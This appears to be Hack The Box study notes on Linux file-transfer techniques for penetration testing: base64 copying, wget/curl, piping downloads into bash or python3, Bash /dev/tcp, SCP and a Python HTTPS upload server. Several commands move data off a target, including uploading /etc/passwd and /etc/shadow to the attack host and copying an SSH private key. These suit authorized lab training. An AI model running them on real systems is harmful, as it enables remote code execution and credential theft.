---
title: Linux File Transfer Methods
source: Hack The Box
module: File Transfers
tags:
  - htb
  - linux
  - file-transfer
  - bash
  - ssh
  - scp
  - curl
  - wget
  - pentesting
---

# 🐧 Linux File Transfer Methods

> [!info]+ 📌 Why This Matters
> Linux is a versatile operating system that commonly includes many tools capable of transferring files.
>
> Understanding these methods is useful for both sides:
> - 🔴 **Attackers** → transfer tools, scripts, payloads, and collected data
> - 🔵 **Defenders** → identify suspicious transfers and prevent sophisticated attacks

---

## 🕵️ Case Study — Multi-Method Malware Download

> [!example]+ 🎯 Real Incident Response Example
> During an incident response engagement, multiple threat actors were found on ==six out of nine web servers==.
>
> The attack followed this general process:
>
> 1. 🌐 The threat actor discovered a **SQL Injection vulnerability**
> 2. 📜 They used it to execute a malicious **Bash script**
> 3. ⬇️ The script attempted to download another malware component
> 4. 📡 The downloaded malware connected to the attacker's **Command and Control server**

### 🔄 Download Fallback Chain

```text
cURL
  │
  ├── Success → Download malware
  │
  └── Failure
        │
        ▼
      wget
        │
        ├── Success → Download malware
        │
        └── Failure
              │
              ▼
            Python
              │
              └── Download malware
```

> [!quote]+ 💡 Key Takeaway
> The script tried ==three different download methods==:
>
> 1. `curl`
> 2. `wget`
> 3. `Python`
>
> All three communicated over **HTTP**.

Although Linux supports protocols such as **FTP** and **SMB**, malware across different operating systems commonly uses **HTTP** and **HTTPS** for communication.

This lesson covers Linux file transfers using:

- 🔤 Base64
- 🌐 `wget` and `curl`
- 👻 Fileless execution through pipes
- 🐚 Bash `/dev/tcp`
- 🔐 SSH and SCP
- 📤 HTTPS upload servers
- 🖥️ Temporary web servers

---

# 📥 Download Operations

> [!abstract]+ 🗺️ Scenario
> We have access to **NIX04**, a Linux target, and need to download a file from our **Pwnbox** attack machine.

---

## 1️⃣ Base64 Encoding & Decoding

> [!tip]+ 🧩 When to Use
> Base64 transfer is useful when:
>
> - Network communication is unavailable
> - You only have terminal access
> - The file is small enough to copy and paste
> - You want to transfer data through a text-only channel

The basic process is:

```text
Original File
     │
     ▼
Base64 Encode
     │
     ▼
Copy Encoded Text
     │
     ▼
Paste on Target
     │
     ▼
Base64 Decode
     │
     ▼
Original File Restored
```

### Step 1 — Check the Original File Hash 🐧

Before transferring the file, calculate its MD5 hash.

```bash
md5sum id_rsa
```

```text
4e301756a07ded0a2dd6953abf015278  id_rsa
```

> [!info]+ 🔎 Why Check the Hash?
> A hash acts like a file's digital fingerprint. If the original and transferred files have the same hash, the transfer was successful and the file was not corrupted.

---

### Step 2 — Encode the File on Pwnbox 🔤

```bash
cat id_rsa | base64 -w 0; echo
```

> [!note]+ 🧠 Command Breakdown
> - `cat id_rsa` → prints the file's contents
> - `|` → sends the output into the next command
> - `base64` → converts the data into Base64 text
> - `-w 0` → disables line wrapping and produces one long line
> - `; echo` → prints a newline, making the output easier to copy

Example output:

```text
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
```

---

### Step 3 — Decode the File on the Linux Target 🐧

Copy the Base64 text, paste it into the target terminal, and decode it:

```bash
echo -n '<BASE64_STRING>' | base64 -d > id_rsa
```

> [!note]+ 🧠 Command Breakdown
> - `echo -n` → prints the text without adding a newline
> - `base64 -d` → decodes the Base64 data
> - `>` → writes the decoded data into a file
> - `id_rsa` → output filename

---

### Step 4 — Confirm the Hash ✅

```bash
md5sum id_rsa
```

```text
4e301756a07ded0a2dd6953abf015278  id_rsa
```

> [!success]+ ✅ Transfer Verified
> The original and transferred MD5 hashes match:
>
> `4e301756a07ded0a2dd6953abf015278`

> [!tip]+ 📤 Reverse the Process for Uploads
> Base64 can also be used to upload files:
>
> 1. Encode the file on the compromised target
> 2. Copy the Base64 output
> 3. Decode it on the Pwnbox
> 4. Compare hashes to verify integrity

---

## 2️⃣ Web Downloads with `wget` and `curl`

> [!info]+ 🌐 Common Linux Web Utilities
> Two of the most common Linux utilities for interacting with web resources are:
>
> - `wget`
> - `curl`
>
> They are installed by default on many Linux distributions.

---

### Download with `wget`

Use `-O` with an uppercase **O** to specify the output filename.

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

> [!note]+ 🧠 Syntax
> ```text
> wget <URL> -O <OUTPUT_FILE>
> ```

| Option | Meaning |
|---|---|
| `-O` | Save the downloaded content using the specified filename |
| `/tmp/LinEnum.sh` | Destination path on the Linux target |

---

### Download with `curl`

Use `-o` with a lowercase **o** to specify the output filename.

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

> [!note]+ 🧠 Syntax
> ```text
> curl -o <OUTPUT_FILE> <URL>
> ```

| Tool | Output Option | Example |
|---|---:|---|
| `wget` | Uppercase `-O` | `wget <URL> -O file` |
| `curl` | Lowercase `-o` | `curl -o file <URL>` |

> [!warning]+ ⚠️ Easy Mistake
> Do not confuse:
>
> - `wget -O` → uppercase **O**
> - `curl -o` → lowercase **o**

---

## 3️⃣ Fileless Attacks Using Linux Pipes

> [!danger]+ 👻 What Does “Fileless” Mean?
> Linux pipes allow downloaded content to be passed directly into an interpreter without first saving the script as a normal file on disk.
>
> Common interpreters include:
>
> - `bash`
> - `sh`
> - `python`
> - `python3`
> - `perl`
> - `ruby`

General flow:

```text
Web Server
    │
    ▼
curl / wget
    │
    ▼
Pipe |
    │
    ▼
Interpreter
    │
    ▼
Execute in Memory
```

> [!warning]+ ⚠️ Important Detail
> The initial script may not be saved to disk, but the executed payload can still create files.
>
> For example, some payloads using `mkfifo` create temporary filesystem objects. Therefore, ==fileless execution does not guarantee that nothing touches disk==.

---

### Fileless Download with `curl`

Instead of saving the script, pipe it directly into Bash:

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

> [!note]+ 🧠 Command Flow
> `curl` downloads the script → `|` passes it to `bash` → Bash executes it directly.

---

### Fileless Download with `wget`

The same technique works with `wget` and Python:

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

```text
Hello World!
```

> [!note]+ 🧠 Understanding `-qO-`
> - `-q` → quiet mode
> - `-O-` → write downloaded content to standard output
> - `| python3` → send the script directly to the Python 3 interpreter

> [!success]+ ✅ Key Difference
> ```text
> Normal Download:
> URL → File on Disk → Interpreter
>
> Piped Execution:
> URL → Standard Output → Interpreter
> ```

---

## 4️⃣ Download with Bash `/dev/tcp`

> [!tip]+ 🐚 When to Use
> Bash `/dev/tcp` can help when common transfer utilities such as `curl`, `wget`, `scp`, and FTP clients are unavailable.

This feature requires:

- Bash version **2.04 or newer**
- Bash compiled with `--enable-net-redirections`

> [!info]+ 📁 What is `/dev/tcp`?
> `/dev/tcp/<host>/<port>` is not a normal file. Bash interprets it as a request to open a TCP network connection.

---

### Step 1 — Connect to the Web Server

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

> [!note]+ 🧠 Command Breakdown
> - `exec` → modifies file descriptors in the current shell
> - `3<>` → opens file descriptor `3` for reading and writing
> - `/dev/tcp/10.10.10.32/80` → connects to TCP port 80 on the server

---

### Step 2 — Send an HTTP GET Request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

> [!note]+ 🧠 Command Breakdown
> - `echo -e` → enables escape sequence interpretation
> - `GET /LinEnum.sh HTTP/1.1` → requests the target resource
> - `>&3` → sends the request through file descriptor `3`

---

### Step 3 — Read the Server Response

```bash
cat <&3
```

> [!note]+ 🧠 Command Breakdown
> - `<&3` → reads data from file descriptor `3`
> - `cat` → prints the HTTP response to the terminal

> [!warning]+ ⚠️ Raw HTTP Response
> This method prints both the **HTTP headers** and the requested content. Additional processing may be needed if you want to save only the response body.

---

## 5️⃣ SSH Downloads with SCP

> [!info]+ 🔐 SSH and SCP
> **SSH**, or Secure Shell, provides encrypted remote access.
>
> **SCP**, or Secure Copy, transfers files securely using SSH and normally communicates over ==TCP/22==.

SCP can copy:

- Local → Remote
- Remote → Local
- Individual files
- Directories using `-r`

### 🧠 SCP Syntax

```text
scp [source] [destination]
```

A remote path uses this format:

```text
username@remote_host:/remote/path
```

---

### Step 1 — Enable the SSH Server on Pwnbox

```bash
sudo systemctl enable ssh
```

> [!note]+ 📝 What `enable` Does
> This configures the SSH service to start automatically during system boot. It does not necessarily start it immediately.

---

### Step 2 — Start the SSH Server

```bash
sudo systemctl start ssh
```

> [!tip]+ ⚡ Enable and Start Together
> Both actions can usually be performed with:
>
> ```bash
> sudo systemctl enable --now ssh
> ```

---

### Step 3 — Confirm SSH is Listening

```bash
netstat -lnpt
```

Example output:

```text
Proto Recv-Q Send-Q Local Address    Foreign Address    State     PID/Program name
tcp        0      0 0.0.0.0:22     0.0.0.0:*          LISTEN    -
```

> [!success]+ ✅ SSH Server Ready
> `0.0.0.0:22 LISTEN` means SSH is listening on TCP port 22 on all IPv4 interfaces.

If `netstat` is unavailable, use:

```bash
ss -lnpt
```

---

### Step 4 — Download a File Using SCP

Run the following from the Linux target:

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

> [!note]+ 🧠 Command Breakdown
> - `plaintext` → username on the Pwnbox
> - `192.168.49.128` → Pwnbox IP address
> - `/root/myroot.txt` → remote source file
> - `.` → save it in the current local directory

The transfer direction is:

```text
Pwnbox:/root/myroot.txt
          │
          ▼
Linux Target:Current Directory
```

> [!warning]+ 🔑 Credential Safety
> Avoid exposing your primary credentials or private SSH keys on a compromised machine.
>
> A safer approach is to create a ==temporary file-transfer account== with limited permissions and remove it afterward.

---

# 📤 Upload Operations

> [!abstract]+ 🗺️ Use Cases
> Uploading files from a Linux target to an attack host may be necessary for:
>
> - 🧪 Binary exploitation analysis
> - 📡 Packet capture analysis
> - 📋 Log collection
> - 🗃️ Evidence collection
> - 🔐 Offline password auditing
>
> Many download methods can also work in reverse.

---

## 1️⃣ HTTPS Web Upload

> [!info]+ 🌐 Python Upload Server
> The Python `uploadserver` module extends the standard HTTP server and provides a file upload endpoint.
>
> In this example, HTTPS is used to encrypt the communication.

---

### Step 1 — Install `uploadserver` on Pwnbox

```bash
sudo python3 -m pip install --user uploadserver
```

> [!note]+ 🧠 Option Breakdown
> - `python3 -m pip` → runs pip through Python 3
> - `install uploadserver` → installs the upload server module
> - `--user` → installs it for the current user

---

### Step 2 — Create a Self-Signed Certificate

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

> [!note]+ 🔍 OpenSSL Options
>
> | Option | Purpose |
> |---|---|
> | `req` | Creates or processes certificate requests |
> | `-x509` | Generates a self-signed X.509 certificate |
> | `-out server.pem` | Writes the certificate to `server.pem` |
> | `-keyout server.pem` | Writes the private key to the same PEM file |
> | `-newkey rsa:2048` | Creates a new 2048-bit RSA key |
> | `-nodes` | Does not encrypt the private key with a password |
> | `-sha256` | Uses SHA-256 for signing |
> | `-subj '/CN=server'` | Sets the certificate Common Name |

> [!warning]+ 🔒 Protect the Certificate
> The `server.pem` file includes private key material. The web server's shared directory should not expose it for download.

---

### Step 3 — Create a Separate Web Root

```bash
mkdir https && cd https
```

> [!tip]+ 📁 Why Use a Separate Directory?
> Running the server from another directory prevents the certificate file and unrelated files from being exposed through the web server.

---

### Step 4 — Start the HTTPS Upload Server

```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```text
File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

> [!success]+ ✅ Server Details
> - Protocol: **HTTPS**
> - Port: **TCP/443**
> - Upload endpoint: `/upload`

---

### Step 5 — Upload Multiple Files from the Linux Target

```bash
curl -X POST https://192.168.49.128/upload \
-F 'files=@/etc/passwd' \
-F 'files=@/etc/shadow' \
--insecure
```

> [!note]+ 🧠 Command Breakdown
> - `-X POST` → sends an HTTP POST request
> - `-F` → submits a file using multipart form data
> - `files=@/path/file` → attaches a local file
> - Multiple `-F` options → upload multiple files
> - `--insecure` → accepts the self-signed certificate

> [!warning]+ ⚠️ About `--insecure`
> `--insecure` disables normal certificate validation and should only be used when you intentionally trust the self-signed certificate, such as inside an authorized lab.
>
> In production, use a trusted certificate or explicitly trust the correct certificate.

---

## 2️⃣ Alternative Web File Transfer

> [!info]+ 🖥️ Temporary Web Servers
> Linux systems commonly include Python, PHP, or Ruby. These languages can quickly start a temporary web server from the current directory.
>
> This is useful when you want the Pwnbox to **download a file from the target**.

The transfer direction is:

```text
Compromised Linux Target
        │
        │ Hosts the file over HTTP
        ▼
Pwnbox downloads the file
```

> [!warning]+ 📌 Important Distinction
> Although this is listed under upload operations, the target is not actively uploading the file.
>
> Instead:
>
> 1. The target hosts the file
> 2. The Pwnbox connects inbound
> 3. The Pwnbox downloads it

---

### Python 3 Web Server

Run this inside the directory containing the files:

```bash
python3 -m http.server
```

```text
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Default port: ==TCP/8000==

Specify another port if needed:

```bash
python3 -m http.server 9000
```

---

### Python 2.7 Web Server

```bash
python2.7 -m SimpleHTTPServer
```

```text
Serving HTTP on 0.0.0.0 port 8000 ...
```

> [!warning]+ 🧓 Legacy Version
> Python 2 is end-of-life and may not be installed on modern Linux systems.

---

### PHP Web Server

```bash
php -S 0.0.0.0:8000
```

```text
PHP Development Server (http://0.0.0.0:8000) started
```

---

### Ruby Web Server

```bash
ruby -run -ehttpd . -p8000
```

```text
INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

---

### Download the Hosted File from Pwnbox

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

Example output:

```text
--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Saving to: 'filetotransfer.txt'

filetotransfer.txt                 100%[==================>] 
'filetotransfer.txt' saved
```

### 📋 Temporary Web Server Cheat Sheet

| Language | Command | Default Port |
|---|---|---:|
| Python 3 | `python3 -m http.server` | 8000 |
| Python 2.7 | `python2.7 -m SimpleHTTPServer` | 8000 |
| PHP | `php -S 0.0.0.0:8000` | 8000 |
| Ruby | `ruby -run -ehttpd . -p8000` | 8000 |

> [!danger]+ 🚨 Security Warning
> Temporary development servers usually provide little or no access control.
>
> - Only serve the intended directory
> - Do not expose sensitive unrelated files
> - Stop the server after the transfer
> - Prefer trusted and isolated lab networks
> - Consider binding to a specific interface when possible

> [!warning]+ 🧱 Firewall Consideration
> This method requires an inbound connection from the Pwnbox to the target's temporary web server.
>
> If inbound traffic is blocked by a firewall, NAT, or host policy, the transfer will fail even if the web server starts correctly.

---

## 3️⃣ SCP Upload

> [!info]+ 🔐 When to Use
> If outbound SSH traffic over ==TCP/22== is allowed, `scp` can securely transfer files from the target to an SSH server.

### Upload a File Using SCP

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

Example output:

```text
htb-student@10.129.86.90's password:
passwd                                    100% 3414     6.7MB/s   00:00
```

The transfer direction is:

```text
Local Linux Machine:/etc/passwd
                │
                ▼
Remote Host:/home/htb-student/passwd
```

> [!note]+ 🧠 Command Breakdown
> - `/etc/passwd` → local source file
> - `htb-student` → remote SSH username
> - `10.129.86.90` → remote host
> - `/home/htb-student/` → remote destination directory

---

### Upload a Directory Recursively

```bash
scp -r ./collection htb-student@10.129.86.90:/home/htb-student/
```

> [!tip]+ 💡 Remember the Syntax
> SCP syntax is similar to `cp`:
>
> ```text
> scp <SOURCE> <DESTINATION>
> ```
>
> The side containing `user@host:` is the remote side.

---

# 🧠 Recap

> [!summary]+ 📊 Linux File Transfer Methods
>
> | Method | Protocol / Port | Download | Upload | Key Detail |
> |---|---|:---:|:---:|---|
> | 🔤 Base64 | None / copy-paste | ✅ | ✅ | Best for small files and text-only channels |
> | 🌐 `wget` | HTTP/HTTPS | ✅ | Limited | Use uppercase `-O` for output |
> | 🌐 `curl` | HTTP/HTTPS | ✅ | ✅ | Use lowercase `-o`; supports POST uploads |
> | 👻 Pipes | HTTP/HTTPS | ✅ | — | Executes content without saving the initial script normally |
> | 🐚 Bash `/dev/tcp` | Raw TCP | ✅ | Possible | Useful when common transfer tools are missing |
> | 🔐 SCP | SSH · TCP/22 | ✅ | ✅ | Encrypted and authenticated |
> | 📤 `uploadserver` | HTTP/HTTPS | — | ✅ | Provides an `/upload` endpoint |
> | 🐍 Python web server | HTTP · TCP/8000 | ✅ | Pull from target | Quick temporary server |
> | 🐘 PHP web server | HTTP · configurable | ✅ | Pull from target | Useful when PHP is installed |
> | 💎 Ruby web server | HTTP · configurable | ✅ | Pull from target | Uses WEBrick |

---

## ⚡ Quick Command Reference

### 🔤 Base64 Download

```bash
# Source — encode
cat file | base64 -w 0; echo

# Target — decode
echo -n '<BASE64>' | base64 -d > file

# Verify
md5sum file
```

### 🌐 Web Downloads

```bash
# wget
wget <URL> -O <OUTPUT_FILE>

# curl
curl -o <OUTPUT_FILE> <URL>
```

### 👻 Fileless Execution

```bash
curl <SCRIPT_URL> | bash
```

```bash
wget -qO- <SCRIPT_URL> | python3
```

### 🐚 Bash `/dev/tcp`

```bash
exec 3<>/dev/tcp/<IP>/<PORT>
echo -e "GET /<FILE> HTTP/1.1\n\n">&3
cat <&3
```

### 🔐 SCP Download

```bash
scp <USER>@<REMOTE_IP>:<REMOTE_FILE> <LOCAL_DESTINATION>
```

### 🔐 SCP Upload

```bash
scp <LOCAL_FILE> <USER>@<REMOTE_IP>:<REMOTE_DESTINATION>
```

### 📤 HTTPS Upload Server

```bash
openssl req -x509 -out server.pem -keyout server.pem \
-newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```bash
curl -X POST https://<SERVER_IP>/upload \
-F 'files=@<FILE_PATH>' \
--insecure
```

### 🖥️ Temporary Web Servers

```bash
python3 -m http.server
```

```bash
python2.7 -m SimpleHTTPServer
```

```bash
php -S 0.0.0.0:8000
```

```bash
ruby -run -ehttpd . -p8000
```

---

